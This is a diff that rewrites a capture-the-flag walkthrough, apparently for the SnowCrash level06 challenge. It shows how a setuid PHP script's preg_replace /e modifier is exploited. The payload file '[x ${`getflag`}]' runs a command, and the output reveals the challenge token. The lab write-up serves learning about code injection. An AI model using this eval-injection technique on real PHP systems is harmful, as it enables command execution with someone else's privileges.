@@ -1,38 +1,62 @@
-At the home directorie there is a .php file : level06.php.
-It is the source code of the program : level06
+In the home directory, there exists a .php file named level06.php, which serves as the source code for the program level06.
+The program level06 has setuid bits, denoted as:
 
-The program level06 has a setuid bits :
+```bash
+-rwsr-x---+ 1 flag06 level06 7503 Aug 30 2015 level06
+```
 
-       |
-       v
-    -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+This signifies that the program is always executed with the privileges of the user flag06.
 
-It means that the program is always executed with the right of the user flag06.
+The content of level06.php is as follows:
 
+```php
 <?php
 function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
 function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
 $r = x($argv[1], $argv[2]); print $r;
 ?>
+```
 
-The php script is using the function x() with the user argument :
-    x($argv[1], $argv[2]);
+The PHP script utilizes the function x() with user-supplied arguments:
 
-Then it's opening the file path of the first argument :
-    $a = file_get_contents($y);
+```php
+x($argv[1], $argv[2]);
+```
 
-Finally it's capturing /[x (.*)]/ and executing what was captured "/e" with the eval regex modifier :
-    preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+It then opens the file path specified in the first argument:
 
-We need to creat a file and give the path as argument :
-    file : [x `getflag`]
-This won't work beacause the php string analysis won't interpet the matched string "`getflag`"
+```php
+$a = file_get_contents($y);
+```
 
-We need to use the complexe syntax for the interpretation of complexe expression
-    file : [x ${`getflag`}]
-    ./level06 /tmp/payload
+Finally, it captures the pattern /[x (.*)]/ and executes what was captured using the eval regex modifier `(/e)`:
 
-Finaly it gave use an error, but the matched expression is evaluated :
+```php
+preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
+```
 
-    PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
-    in /home/user/level06/level06.php(4) : regexp code on line 1
+To exploit this, we need to create a file and provide its path as an argument.
+Using the backtick (PHP execution operator) around the command `getflag`, we initially create the file as:
+
+```
+[x `getflag`]
+```
+
+However, due to PHP string analysis, this won't work as intended because the matched string "`getflag`" won't be interpreted. Instead, we must use the complex syntax for the interpretation of complex expressions:
+
+```
+[x ${`getflag`}]
+```
+
+Executing this with the following command:
+
+```bash
+./level06 /tmp/payload
+```
+
+Results in an error, but the matched expression is evaluated:
+
+```plaintext
+PHP Notice: Undefined variable: Check flag. Here is your token: wiok45aaoguiboiki2tuin6ub
+in /home/user/level06/level06.php(4) : regexp code on line 1
+```
